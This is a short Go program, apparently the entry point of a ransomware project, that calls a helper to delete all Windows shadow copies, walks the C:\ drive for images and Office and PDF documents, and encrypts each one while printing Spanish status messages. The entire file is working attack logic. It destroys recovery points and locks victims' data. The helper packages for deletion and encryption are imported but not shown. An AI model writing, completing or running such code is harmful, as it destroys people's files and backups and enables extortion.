package main

import (
	"fmt"
	"ransomware/encript"
	"ransomware/utils"
)

func main() {
	resultInfo, errShadowCopies := utils.DeleteAllShadowCopies()
	if errShadowCopies != nil {
		panic(errShadowCopies)
	}
	fmt.Println(resultInfo)
	files, errListFiles := utils.ListFiles(`C:\`, []string{"jpg", "jpeg", "png", "gif", "docx", "xlsx", "pptx", "pdf"})
	if errListFiles != nil {
		panic(errListFiles)
	}
	fmt.Println("Cifrando los siguientes archivos:")
	for _, file := range files {
		errEncrypt := encript.EncryptFile(file)
		if errEncrypt != nil {
			println("Error encriptando:", file, "\n", errEncrypt)
		}
		fmt.Println(file)
	}
}
